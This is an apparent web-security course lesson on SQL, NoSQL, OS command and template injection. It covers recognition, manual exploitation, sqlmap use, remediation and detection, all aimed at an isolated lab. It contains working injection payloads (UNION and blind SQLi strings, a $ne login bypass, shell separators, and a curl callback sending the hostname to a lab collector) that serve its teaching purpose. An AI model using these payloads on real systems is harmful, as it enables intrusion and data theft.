# 07.3 — Injection: SQL, NoSQL, command injection &amp; server-side template injection (SSTI)

<div class="prereq">

**Prerequisites:** [07.1 The web attack model](lesson-01.md) (intercept &amp; replay in Repeater),
[00.3 Threat modeling &amp; the confused deputy](../module-00/lesson-03.md),
[01.2 HTTP/TLS](../module-01/lesson-02.md), and [00.1 authorization](../module-00/lesson-01.md).
Recognizing the injection *class* builds on the trust-boundary reasoning from 00.3.
**Module:** M07 (major). **Difficulty:** 🔴 advanced.
**You will produce:** one injection identified **from behavior alone**, proven with an inert marker
(a synthetic flag or a computed value), with impact, remediation, and detection.

</div>

## Why this matters

Injection is the oldest and still one of the most damaging web vulnerability classes: a single SQL
injection can dump an entire user database; a command injection can be full server takeover. But the
reason it earns a dedicated lesson is that all of its forms — SQL, NoSQL, OS command, template — are
the *same idea* wearing different clothes, and once you see the idea you recognize the bug in any
interpreter you meet, including ones invented after this course. This lesson is where you stop memorizing
payloads and start reasoning about **when data crosses into code**.

## Learning objectives

- State the injection **class** in one sentence and apply it to SQL, NoSQL, shell, and template engines.
- Recognize each injection from **application behavior** — errors, differential responses, timing —
  before reaching for a payload list.
- Perform **manual** SQLi: in-band `UNION` (walking columns), boolean-blind, time-blind, and
  error-based, and explain why each works.
- Recognize **NoSQL** operator/syntax injection (`$ne`, `$gt`, `$where`) and **OS command** injection
  (`;`, `|`, `$()`, blind/OOB).
- Detect **SSTI** per engine (`{{7*7}}`→`49`) and explain the conceptual path from detection to RCE.
- Use `sqlmap` responsibly — as an accelerator, with safe flags and hand-verification.

## Intuition

Every injection is one sentence: **untrusted input is concatenated into a string that an interpreter
then parses, so the input's *content* becomes part of the *instructions*.** The interpreter cannot tell
"data the developer meant" from "code the attacker supplied" because they arrive as the same
undifferentiated text. A SQL engine, a Mongo query parser, a shell, a template renderer — each is a
confused deputy (00.3) that executes what it's given, and the developer handed it a string built partly
from you. Fix the *mixing* (keep data and code in separate channels — parameterization) and the whole
class disappears. Recognize the *mixing* and you've found the bug regardless of which interpreter is
downstream.

## The underlying technology — one class, many interpreters

<div class="callout key">

The pattern to internalize: **input → string concatenation → interpreter → the input changed the
parse.** You recognize an injection candidate wherever your input is reflected into a query, a command,
a path, or a rendered template *and the response changes in a way that only makes sense if a parser
reacted to your syntax.* The interpreter differs; the reasoning is identical. This is the link back to
00.3's trust boundary and 01.2's "the client controls every byte."

</div>

### SQL injection

The app builds a query like `SELECT * FROM users WHERE name = '` + input + `'`. Supply
`' OR '1'='1` and the `WHERE` clause is now always true; supply `'` alone and you may break the syntax
and trigger an error. The forms:

- **In-band / UNION** — you can read the query's own response. `UNION SELECT` appends a second result
  set, letting you pull arbitrary columns — *if* you match the original query's column count and
  compatible types. You find the column count by walking it:

```sql
-- LAB ONLY. Increment until the error stops (or ORDER BY fails) → column count.
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -      -- error at 4 → 3 columns
-- Then place markers in each column to see which are reflected and type-compatible:
' UNION SELECT 'AAA','BBB','CCC'-- -
-- Finally read synthetic data (LAB flag lives in a benign table):
' UNION SELECT flag, username, NULL FROM lab_secrets-- -   -- → LAB-FLAG-...
```

- **Error-based** — the app leaks DB error text; you coerce data into the error message
  (`extractvalue`, `updatexml`, `CAST`), reading it from the error itself. Requires verbose errors.
- **Boolean-blind** — no data and no error come back, but the response *differs* between a true and a
  false condition. You ask yes/no questions and read the answer from the page:

```sql
-- Page shows "Welcome" when true, "Invalid" when false → 1 bit per request.
' AND SUBSTRING((SELECT flag FROM lab_secrets),1,1)='L'-- -
```

- **Time-blind** — even the true/false difference is invisible, so you make *true* take longer:

```sql
-- Response delayed ~5s when the condition holds → 1 bit per request, read from the clock.
'; IF(SUBSTRING((SELECT flag FROM lab_secrets),1,1)='L', SLEEP(5), 0)-- -   -- MySQL
' AND (SELECT CASE WHEN (…) THEN pg_sleep(5) ELSE 0 END)-- -                 -- Postgres
```

Blind techniques are slow (one bit per request) but recover data with **no** direct output — the
timing or the boolean *is* the channel.

### NoSQL injection

Document stores (MongoDB) don't use SQL, but they parse **query objects**, and if user input is placed
into that object as structure rather than a value, you inject **operators**. The classic auth bypass:

```json
// Intended: {"user":"lab","pass":"Lab-Passw0rd!"}
// If the app builds the query from JSON body fields without validation, send instead:
{"user":"admin","pass":{"$ne":"x"}}
// $ne = "not equal": password ≠ "x" is true for the real password → login as admin without it.
// $gt:"" , $regex:"^a" , and $where:"sleep(5000)" (JS eval) are the other workhorses.
```

Recognition: switching `Content-Type` to `application/json` and replacing a string value with an
`{"$ne":...}` object changes the auth result — behavior only an operator-parsing engine would produce.

### OS command injection

The app passes input to a shell (`system("ping " + host)`, backticks, `os.system`, `Runtime.exec` with
`sh -c`). Shell **metacharacters** end one command and start another:

```bash
# host field. Each separator reaches the shell because input is concatenated into `sh -c "..."`.
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 $(id)          # command substitution
`id`                     # backtick substitution
```

The input reaches a shell because the developer built a **shell command string** instead of executing a
program with an argument vector. **Blind command injection** (no output) is confirmed out-of-band: make
the server do something observable — a delay (`; sleep 5`) or, in the lab, a DNS/HTTP callback to a
lab-internal collector (`; curl http://collector.lab/$(hostname)`). On the lab the collector is an
isolated container; **never** an Internet host.

### Server-side template injection (SSTI)

Template engines (Jinja2, Twig, Freemarker, Velocity, ERB) render pages by evaluating expressions
inside markers. If user input is placed *into the template source* rather than passed as *data to* the
template, your input is evaluated as a template expression. The universal detector is arithmetic:

```text
Input:  {{7*7}}      → output 49   (Jinja2/Twig — double braces)
Input:  ${7*7}       → output 49   (Freemarker/JSP EL)
Input:  #{7*7}       → output 49   (some engines)
Input:  <%= 7*7 %>   → output 49   (ERB)
```

If `{{7*7}}` comes back as `49`, the input was **evaluated**, not printed — that single fact
distinguishes SSTI from reflected XSS (where `{{7*7}}` would appear verbatim). Which marker evaluates
tells you the engine; from there, engine-specific object traversal reaches the runtime (e.g. Jinja2's
`{{ ''.__class__.__mro__ }}` chain to `os`), and SSTI becomes **remote code execution**. *Conceptually*
the jump is: expression evaluation → reach a built-in that runs code → RCE. In the lab you prove the
mechanism by reading a benign `LAB-FLAG` via the engine, not by launching anything destructive.

## Why the weakness exists

Someone built an instruction (query/command/template) by **string concatenation** with untrusted input,
because it is the most natural way to code and the safe API (parameterized queries, argument vectors,
sandboxed/data-only templates) takes an extra step. The interpreter then faithfully parses the whole
string. Underlying CWEs: **CWE-89** (SQLi), **CWE-943** (NoSQL/data-query injection), **CWE-78** (OS
command injection), **CWE-1336/CWE-94** (SSTI/code injection) — all children of **CWE-74**, "improper
neutralization of special elements," the injection class itself.

## How a tester recognizes it (from behavior)

<div class="callout method">

- **SQLi:** a `'` or `"` triggers a `500`/DB error or a broken page; `' OR '1'='1` changes results;
  arithmetic/`SLEEP` in a numeric field changes timing; the same request with `AND 1=1` vs `AND 1=2`
  returns different content (boolean) or different delay (time). *You are looking for the parser
  reacting.*
- **NoSQLi:** a JSON body where a string can be swapped for an `{"$ne":…}`/`{"$gt":…}` object changes
  auth or results; `Content-Type` juggling matters.
- **Command injection:** a field that feeds a system action (ping, DNS lookup, PDF/image conversion,
  archive) reacts to `;`/`|`/`$()` with extra output, or to `; sleep 5`/an OOB callback with a delay/
  hit.
- **SSTI:** `{{7*7}}`/`${7*7}` renders as `49` (evaluated) rather than literally (that's XSS territory,
  a later lesson) — the arithmetic oracle is the cleanest tell.

The unifying recognition: **inject syntax, watch for a parser's reaction** — an error, a differential
response, a delay, or a computed value.

</div>

## Manual investigation

Always characterize by hand in Repeater before any automated tool — one variable at a time:

```http
POST /search HTTP/1.1
Host: webapp.lab
Content-Type: application/x-www-form-urlencoded

q=widget'                         → 500 + "SQL syntax ... near '''"   (candidate)

q=widget' AND '1'='1              → normal results
q=widget' AND '1'='2              → zero results        (boolean oracle confirmed)

q=widget' ORDER BY 5-- -          → error;  ORDER BY 4-- - → ok        (4 columns)
q=widget' UNION SELECT 'X',NULL,NULL,NULL-- -   → 'X' appears in col 1 (reflected column)
```

The manual pass tells you *which* technique the target permits (does it error? reflect? only differ?
only delay?), which is exactly the information `sqlmap` needs and the proof a scanner can't give you.

## Tooling — what it does, key options, limits, verify by hand

<div class="callout method">

- **sqlmap** — automates detection and exploitation of SQLi across techniques and DBMSes. Feed it the
  exact request (`-r request.txt` saved from the proxy), mark the parameter (`-p q`), and **constrain
  it**: `--technique=BU` (only the techniques you confirmed), `--level`/`--risk` low unless justified,
  `--batch` for non-interactive, `--dbms=` if known. To read data: `--dbs`, `--tables`, `--dump -T
  lab_secrets`. **Limits &amp; safety:** high `--risk` sends potentially destructive payloads (stacked
  queries, `OR` that can update rows) — **keep risk low on anything you don't own**; it's noisy
  (hundreds of requests → WAF/log alerts, RoE rate limits); `--os-shell`/`--file-write` are heavy and
  often out of scope. It is an *accelerator for the injection you already proved by hand*, never a
  first move.
- **NoSQLMap / manual JSON tampering** — operator-injection candidates; verify the auth/behavior change
  yourself.
- **tplmap** — SSTI detection/exploitation across engines. Limit: confirm the `49` (or the benign
  read) manually; understand which engine before trusting engine-specific RCE modules.
- **Burp scanner / ZAP active scan** — flag injection candidates. Limit: leads only; confirm in
  Repeater, and they miss context-specific and blind cases a human spots.

</div>

## Exploitation / demonstration (LAB ONLY)

<div class="callout attack">

**UNION SQLi reading a synthetic flag.** Having confirmed 4 columns and a reflected first column:

```http
GET /product?id=8 UNION SELECT flag,2,3,4 FROM lab_secrets-- - HTTP/1.1
Host: webapp.lab

HTTP/1.1 200 OK
...
<h1>Product: LAB-FLAG-7d1e-...</h1>      ← the synthetic secret, read via the reflected column
```

Why it works: `id` was concatenated into `SELECT name,price,sku,stock FROM products WHERE id=8`; your
`UNION SELECT` appends a second, attacker-chosen result set with a matching column count, and the app
renders column 1 — now your `flag` value. **Recognition without the tool:** the `'`/error told you a
parser reacted; `ORDER BY` walking gave the column count; markers found the reflected column. The
exploit is just filling that column with data you want.

**Boolean-blind, if nothing reflects:** confirm with `AND 1=1` vs `AND 1=2` (results present vs
absent), then extract the flag one character at a time with `SUBSTRING(...)= 'x'`, reading each bit from
whether the "present" response comes back. Slow, but the differential response *is* the data channel.

**SSTI proof:** submit `{{7*7}}` in the vulnerable field; a rendered `49` proves server-side
evaluation. In the lab, escalate only as far as reading the benign `LAB-FLAG` through the engine to
demonstrate the RCE mechanism — never a destructive or persistent payload.

</div>

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** Every payload here targets only `labs/lab-07-web` on the isolated
network, reading synthetic data and benign `LAB-FLAG-{uuid}` markers; any OOB callback goes to a
**lab-internal** collector, never the Internet. These payloads prove the *mechanism* (a parser reacted,
data crossed into code) — they are deliberately non-destructive: no `DROP`, no row updates, no file
writes, no real command beyond an inert marker. Running injection payloads against a system you do not
own and are not explicitly authorized to test is a crime (00.1), and even a "harmless" `OR 1=1` can
alter or damage real data. Restate scope, authorization, and the no-destructive-payload rule first.

</div>

## Verification

Prove the interpreter executed your input, not that a page merely changed: SQLi UNION — the response
contains data (`LAB-FLAG`) that could only come from the injected `SELECT`; boolean/time — a
*consistent* correlation between your condition and the response/delay across repeated requests (rule
out flakiness). Command injection — output of your command (`id`, `hostname`) in the response, or a
reliable delay / a hit on the lab collector for blind. SSTI — the computed value (`49`), then the benign
read. Capture the request that carries the payload and the response that carries the proof.

## Impact

- **SQLi:** read/modify the entire database (credentials, PII, the whole `users` table), often
  authentication bypass, sometimes file read/write or RCE via DB features — typically **critical**.
- **NoSQLi:** authentication bypass and data extraction; `$where`/JS eval can reach code execution.
- **Command injection:** arbitrary commands as the web user → foothold, then privesc (M04/M05) and
  lateral movement (M11) — **critical**.
- **SSTI:** server-side code execution in most engines — **critical**. Frame all of these by *reach*:
  what data, which host, what it pivots to (M16).

## Remediation

<div class="callout defend">

- **SQL:** **parameterized queries / prepared statements** (bind variables) everywhere — the single
  fix that separates data from code; ORMs help but raw fragments reintroduce the bug. Least-privilege
  DB accounts; disable verbose errors in production; input allow-listing as defense in depth (not a
  primary control).
- **NoSQL:** validate/cast types (a password field must be a *string*, never an object); reject
  query-operator keys in user input; avoid `$where`/server-side JS.
- **Command:** don't call a shell — execute a program with an **argument array** (`execve`-style, no
  `sh -c`); if a shell is unavoidable, strict allow-list validation and proper escaping; prefer native
  libraries over shelling out.
- **SSTI:** never build templates from user input; pass user data as **template variables**, use
  logic-less/sandboxed templates, and keep the engine's dangerous globals out of reach.
- All are one principle: **keep untrusted data out of the code channel** (CWE-74). CWEs 89, 943, 78,
  94/1336. OWASP **A03 Injection**.

</div>

## Detection / blue-team view

<div class="callout defend">

- **SQLi:** WAF/log signatures for SQL metacharacters and keywords (`UNION SELECT`, `ORDER BY`,
  `SLEEP`, `' OR '`); a burst of near-identical requests differing by one character (blind extraction);
  DB error spikes; abnormally long-running queries (time-blind).
- **NoSQLi:** JSON bodies containing `$`-prefixed operator keys where scalars are expected;
  `Content-Type` flips on auth endpoints.
- **Command injection:** shell metacharacters in parameters; the web-server process spawning
  `sh`/`bash`/`cmd` children (strong signal — web workers rarely fork shells); unexpected outbound
  DNS/HTTP from the app tier (OOB).
- **SSTI:** template metacharacters (`{{`, `${`, `<%`) in input; template-engine errors; the app
  process spawning a shell.
- Maps to **ATT&CK T1190** (Exploit Public-Facing Application) and, post-exploitation, **T1059**
  (Command and Scripting Interpreter). Recurring idea: *a web worker behaving like an interpreter/shell,
  or one client sending syntax no legitimate user would.*

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-07-web` (built separately) — Docker, private no-Internet network, with a
lab-internal OOB collector container for blind cases. **Access:** attacker box with a configured proxy;
synthetic `lab / Lab-Passw0rd!`. **Targets:** the lab app only; proof markers are benign
`LAB-FLAG-{uuid}` values in synthetic tables. **Time:** ~90 min. **Isolation:** private Docker network,
no Internet route; reset per the lab README. **No destructive payloads** — read markers, don't modify
or drop.

</div>

Pick one injectable surface from your 07.1 map, recognize the class from behavior, characterize the
usable technique by hand, prove it with a benign marker (UNION read, boolean/time extraction, command
output, or `{{7*7}}`→`49`), then verify with sqlmap/tplmap on **low risk** and confirm the tool's result
matches your manual finding.

## Exercise

<div class="callout method">

**Situation.** Authorized grey-box test of the lab app; configured proxy, `lab` account, your 07.1 map.

**Objective.** Identify an injection **from behavior alone**, prove it with an **inert marker**, and
assess impact and remediation — a report-ready finding.

**Starting information.** The running app and your map. No source; no hint as to which field is
vulnerable.

**Constraints.** Lab target only; stay in proxy scope and RoE rate limits. Recognize before you exploit
— your write-up must show the *behavioral signal* first. Prove the mechanism only; **no destructive
payloads** (no `DROP`, updates, file writes, or real commands beyond an inert marker); any OOB callback
must target the lab collector. One variable at a time.

**Expected deliverables.**
1. The injection class and the **behavioral evidence** that identified it (the error, the boolean/time
   differential, the operator effect, or the `49`) — *before* any payload that reads data.
2. The technique you used and **why it works** (data crossing into the code channel), with the
   request/response proving the inert marker.
3. **Impact assessment** framed as reach (what data/host, what it pivots to) and a crisp
   **remediation** (the parameterization/argument-vector/data-only-template fix, not "sanitize input").
4. **Detection** mapped to CWE/OWASP/ATT&CK.

</div>

<details><summary>Hint 1 — conceptual direction</summary>
Find where your input is reflected into a query, command, or rendered page. Then send one syntax
character and watch for a parser reacting — an error, a changed result, a delay, or a computed number.
Recognition is a behavior, not a payload.
</details>

<details><summary>Hint 2 — technique family</summary>
Error/reflection → UNION or error-based SQLi. Same page for true, different for false → boolean-blind;
only a delay differs → time-blind. JSON field that accepts an object → NoSQL <code>$ne</code>. A field
feeding ping/lookup/convert → command injection. <code>{{7*7}}</code>→<code>49</code> → SSTI.
</details>

<details><summary>Hint 3 — where to look</summary>
For SQLi, walk columns with <code>ORDER BY</code> then place markers to find the reflected/typed column
before reading data. For blind, confirm with <code>AND 1=1</code> vs <code>AND 1=2</code> first. For
SSTI, prove <code>49</code> before anything engine-specific. Save the request and hand it to sqlmap/
tplmap on low risk only to confirm.
</details>

<details><summary>Hint 4 — specific direction</summary>
If UNION works, match the column count and drop the marker into the reflected column, then swap in the
<code>flag</code> column. If only timing differs, extract the marker one character at a time with
<code>SUBSTRING</code> + <code>SLEEP</code>/<code>pg_sleep</code>. If command injection is blind, use a
delay or a lab-collector callback. Always confirm the tool's finding equals your manual one.
</details>

## Check yourself

<div class="callout key">

1. State the injection class in one sentence, then explain why SQLi, command injection, and SSTI are
   the same bug in different interpreters.
2. You get *no* data and *no* error back, but the page says "found" for `AND 1=1` and "not found" for
   `AND 1=2`. Which technique is available, how many bits per request, and how do you read a secret
   with it?
3. Why does a parameterized query defeat SQLi where "escaping quotes" and input filtering keep failing?
   What exactly changes about how the query is parsed?
4. `{{7*7}}` renders as `49` on one field and as the literal `{{7*7}}` on another. What is each field
   vulnerable to, and why is that a crucial distinction for the report?
5. A login accepts a JSON body and you can turn `"pass":"x"` into `"pass":{"$ne":"x"}` to log in. Explain
   why this bypasses the password check and the one-line fix.
6. Why is `--risk=3` in sqlmap dangerous on a system you don't own, and what is the professional way to
   use sqlmap after a manual finding?

</div>

Model answers are in `solutions/module-07-part1.md` (try them first).

## References

- **OWASP Top 10 (2021)** — A03 Injection.
- **OWASP WSTG v4.2** — WSTG-INPV (Input Validation): SQL Injection, NoSQL Injection, Command
  Injection, Server-Side Template Injection testing.
- **OWASP Cheat Sheets** — SQL Injection Prevention; Query Parameterization; OS Command Injection
  Defense; Injection Prevention.
- **PortSwigger Web Security Academy** — SQL injection, NoSQL injection, OS command injection,
  Server-side template injection (labs and technique write-ups).
- **CWE-74** Injection (class); **CWE-89** SQLi; **CWE-943** NoSQL/Data Query Injection; **CWE-78** OS
  Command Injection; **CWE-94 / CWE-1336** Code/Template Injection.
- **MITRE ATT&CK** — T1190 Exploit Public-Facing Application; T1059 Command and Scripting Interpreter.

## What you should now be able to do

- State the injection class and recognize it in any interpreter from behavior alone.
- Perform manual SQLi (UNION column-walking, error-based, boolean- and time-blind) and explain each.
- Recognize NoSQL operator injection, OS command injection (including blind/OOB), and SSTI
  (`{{7*7}}`→`49`), and explain the conceptual path to RCE.
- Use sqlmap/tplmap as accelerators with safe flags after a hand-verified finding.
- Write the parameterization/argument-vector/data-only-template remediation and the detection for each.

## Progress checkpoint

```bash
py course.py complete 07.3
```
